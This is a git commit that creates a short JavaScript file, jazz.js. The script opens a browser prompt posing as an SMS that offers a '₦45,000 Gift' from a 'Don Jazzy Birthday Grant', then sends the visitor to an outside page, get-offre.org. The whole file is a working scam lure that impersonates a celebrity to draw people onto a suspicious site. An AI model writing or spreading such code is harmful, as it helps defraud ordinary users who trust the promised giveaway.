290d6da05fc0c835a9392b39eacc55b98653e76a
trafficbank <153836234+trafficbank@users.noreply.github.com>
2024-10-18 00:22:45 -0700

    Create jazz.js

---
+++ jazz.js
@@ -0,0 +1,6 @@
+
+var password = 'CLAIM ₦45,000 GIFT '
+password=prompt('SMS: Hello, Claim your ₦45,000 Gift from Don Jazzy Birthday Grant Ending November 26 . Press Ok to Claim now ','CLAIM ₦45,000 GIFT');
+if (password != 'CLAIM ₦45,000 GIFT') {
+location.href='https://get-offre.org/jazzy.html';
+}
